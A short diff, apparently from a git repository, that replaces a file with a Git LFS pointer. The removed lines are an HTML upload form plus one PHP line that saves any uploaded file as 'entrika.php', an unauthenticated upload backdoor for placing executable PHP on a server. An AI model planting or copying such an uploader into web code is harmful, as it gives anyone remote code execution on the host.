@@ -1,9 +1,3 @@
-<FORM ENCTYPE="multipart/form-data" ACTION="uploader.php" METHOD="POST">
-<INPUT TYPE="hidden" name="MAX_FILE_SIZE" value="100000">
-Send this file: <INPUT NAME="userfile" TYPE="file">
-<INPUT TYPE="submit" VALUE="Send">
-</FORM>
-<?
-move_uploaded_file($userfile, "entrika.php"); 
-?>
-
+version https://git-lfs.github.com/spec/v1
+oid sha256:33623f97eb8375943eb6852c95ec6dd3a993108b2c6e9954ea55e9ef7be52216
+size 280
